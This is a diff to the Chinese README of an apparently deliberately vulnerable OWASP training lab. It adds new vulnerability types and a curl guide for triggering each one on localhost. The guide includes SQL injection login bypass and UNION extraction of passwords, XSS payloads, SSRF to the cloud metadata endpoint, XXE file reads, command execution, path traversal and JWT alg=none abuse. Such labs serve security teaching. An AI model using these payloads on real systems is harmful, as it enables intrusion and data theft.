@@ -17,6 +17,13 @@
 - **SSRF (服务器端请求伪造)** - 内网探测、文件读取
 - **XXE (XML外部实体注入)** - 文件读取、SSRF、DoS攻击
 - **RCE (远程代码执行)** - 命令注入、系统命令执行
+- **IDOR 未授权直接对象引用**
+- **Mass Assignment 过度赋值**
+- **Open Redirect 开放重定向**
+- **File Upload + Path Traversal 文件上传与路径遍历**
+- **不安全反序列化 (Java)**
+- **不安全 JWT (alg=none)**
+- **ReDoS 正则拒绝服务**
 
 ## 🏗️ 技术栈
 
@@ -67,7 +74,7 @@ npm install
 npm run dev
 ```
 
-前端应用将在 `http://localhost:3000` 启动
+前端应用将在 `http://localhost:5173` 启动（默认端口）
 
 ## 🔐 测试账户
 
@@ -81,20 +88,87 @@ npm run dev
 ## 📖 使用指南
 
 ### Web界面测试
-访问 `http://localhost:3000` 使用图形界面进行漏洞测试
+访问 `http://localhost:5173` 使用图形界面进行漏洞测试（左侧菜单包含 SQLi/XSS/SSRF/XXE/RCE；“更多漏洞” 页面包含新增漏洞）
 
 ### API测试
 参考 `POC_测试手册.md` 文件，使用curl命令进行API测试
 
-### 示例测试
-```bash
-# XSS测试
-curl -X GET "http://localhost:8080/api/xss/reflected?input=<script>alert('XSS')</script>"
+### 漏洞触发与利用指南（API示例）
+所有接口基址为 `http://localhost:8080/api`。
 
-# SQL注入测试
-curl -X POST http://localhost:8080/api/sqli/vulnerable/login \
-  -H "Content-Type: application/json" \
-  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
+```bash
+# 1) XSS
+## 反射型
+curl "http://localhost:8080/api/xss/reflected?input=<script>alert('XSS')</script>"
+## 存储型：提交恶意评论再读取
+curl -X POST "http://localhost:8080/api/xss/stored/comment" -H 'Content-Type: application/json' -d '{"username":"attacker","comment":"<img src=x onerror=alert(1)>"}'
+curl "http://localhost:8080/api/xss/stored/comments"
+## DOM型：前端页面在 /xss 中演示
+
+# 2) SQL注入
+## 登录绕过
+curl -X POST "http://localhost:8080/api/sqli/vulnerable/login" -H 'Content-Type: application/json' -d '{"username":"admin'\'' OR '\''1'\''='\''1'\'' --","password":"anything"}'
+## UNION注入（查看更多字段）
+curl "http://localhost:8080/api/sqli/vulnerable/search?keyword=' UNION SELECT id,username,password,email,role,secret FROM users --"
+## 盲注/错误注入示例
+curl "http://localhost:8080/api/sqli/vulnerable/user/1' AND (SELECT COUNT(*) FROM users) > 0 --"
+
+# 3) SSRF
+## 任意URL获取
+curl "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://example.com"
+## 图片代理
+curl "http://localhost:8080/api/ssrf/vulnerable/image-proxy?imageUrl=http://example.com/logo.png"
+## 元数据/内网探测（演示环境可能不可达）
+curl "http://localhost:8080/api/ssrf/vulnerable/fetch?url=http://169.254.169.254/latest/meta-data/"
+
+# 4) XXE
+## DOM4J解析（允许外部实体）
+curl -X POST "http://localhost:8080/api/xxe/vulnerable/dom4j" -H 'Content-Type: application/json' -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>"}'
+## DocumentBuilder解析（未禁用实体）
+curl -X POST "http://localhost:8080/api/xxe/vulnerable/documentbuilder" -H 'Content-Type: application/json' -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1\">]><root>&xxe;</root>"}'
+## 攻击辅助端点
+curl "http://localhost:8080/api/xxe/attack/file-read"
+curl "http://localhost:8080/api/xxe/attack/ssrf"
+
+# 5) RCE/命令执行
+## ping
+curl -X POST "http://localhost:8080/api/rce/vulnerable/ping?host=127.0.0.1"
+## 系统命令执行
+curl -X POST "http://localhost:8080/api/rce/vulnerable/system?command=id"
+## 文件操作命令
+curl -X POST "http://localhost:8080/api/rce/vulnerable/file?filename=/etc/hosts&operation=cat"
+
+# 6) IDOR 未授权直接对象引用
+curl "http://localhost:8080/api/idor/user/1"
+
+# 7) Mass Assignment 过度赋值（可直接修改敏感字段）
+curl -X POST "http://localhost:8080/api/idor/user/update" -H 'Content-Type: application/json' -d '{"id":1,"username":"admin","password":"admin123","email":"admin@vulnlab.com","role":"admin","secret":"flag{modified}"}'
+
+# 8) Open Redirect 开放重定向
+curl -I "http://localhost:8080/api/redirect?target=http://example.com"
+
+# 9) 文件上传与路径遍历
+## 上传（表单）
+curl -F 'file=@README.md' "http://localhost:8080/api/upload/file"
+## 读取任意路径（演示路径遍历风险）
+curl "http://localhost:8080/api/upload/read?path=uploads/README.md"
+## 列目录
+curl "http://localhost:8080/api/upload/list?dir=uploads"
+
+# 10) 不安全反序列化
+## 获取示例payload（Base64）
+curl "http://localhost:8080/api/deser/payload?msg=pwn"
+## 提交反序列化
+curl -X POST "http://localhost:8080/api/deser/vulnerable" -H 'Content-Type: application/json' -d '{"data":"<把上一步返回的Base64粘贴到此处>"}'
+
+# 11) 不安全 JWT（alg=none）
+## 获取不安全Token
+curl -X POST "http://localhost:8080/api/jwt/login" -H 'Content-Type: application/json' -d '{"username":"alice"}'
+## 解析（不校验签名）
+curl "http://localhost:8080/api/jwt/me?token=<上一步返回的token>"
+
+# 12) ReDoS 正则拒绝服务
+curl "http://localhost:8080/api/regex/test?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 ```
 
 ## 📁 项目结构
@@ -114,12 +188,19 @@ owasp-vulnlab/
 │   │           ├── sqli/     # SQL注入
 │   │           ├── ssrf/     # SSRF漏洞
 │   │           ├── xxe/      # XXE漏洞
-│   │           └── rce/      # RCE漏洞
+│   │           ├── rce/      # RCE漏洞
+│   │           ├── idor/     # IDOR与过度赋值
+│   │           ├── redirect/ # 开放重定向
+│   │           ├── upload/   # 文件上传与路径遍历
+│   │           ├── deserialization/ # 不安全反序列化
+│   │           ├── jwt/      # 不安全JWT
+│   │           └── regex/    # ReDoS
+└── frontend/                # React前端
 │   └── pom.xml              # Maven配置
 └── frontend/                # React前端
     ├── src/
     │   ├── components/      # 通用组件
-    │   ├── pages/          # 页面组件
+    │   ├── pages/          # 页面组件（含 More 页面）
     │   └── App.jsx         # 主应用组件
     └── package.json        # npm配置
 ```
